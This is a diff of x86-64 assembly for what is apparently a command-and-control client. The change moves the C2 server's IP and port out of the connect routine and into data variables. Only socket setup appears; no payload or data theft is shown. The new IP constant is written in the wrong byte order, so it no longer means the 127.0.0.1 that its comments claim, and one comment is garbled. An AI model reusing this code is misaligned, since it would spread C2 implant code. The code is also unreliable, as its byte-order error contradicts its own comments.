@@ -1,7 +1,7 @@
 section .data
     ; Socket data
-    server_ip db "127.0.0.1", 0x0           ; IP of C2 Server
-    server_port dw 8080                     ; 8080 for alternate HTTP
+    server_ip dd 0x7F000001                     ; IP of C2 Server
+    server_port dw 0x5820                       ; htons(8280)
     socket_fd dq 0x0
     ; Error treating
     err_msg db "Program exits due to errors", 0x0
@@ -656,13 +656,15 @@ fn_connect_client:
     ; 16 bytes
     ; struct sockaddr_in {
     ;   unsigned short sin_family; (2 bytes) AF_INET
-    ;   unsigned short sin_port; (2 bytes) htons(8080)
+    ;   unsigned short sin_port; (2 bytes)  s(port)
     ;   struct in_addr sin_addr; (4 bytes) 127.0.0.1
     ;   char sin_zero[8]; (8 bytes) padding
     ; }
     mov word [rsp], 0x2             ; sin_family = AF_INET
-    mov word [rsp+2], 0x901f        ; sin_port = htons(8080)
-    mov dword [rsp+4], 0x0100007f   ; sin_addr = 127.0.0.1
+    mov ax, [server_port]           ;
+    mov word [rsp+2], ax            ; sin_port = htons(port)
+    mov eax, [server_ip]            ; 
+    mov dword [rsp+4], eax          ; sin_addr = network order(ip)
     mov qword [rsp+8], 0x0          ; sin_zero[8] remains zeroed by default
     
     ; Connect to socket
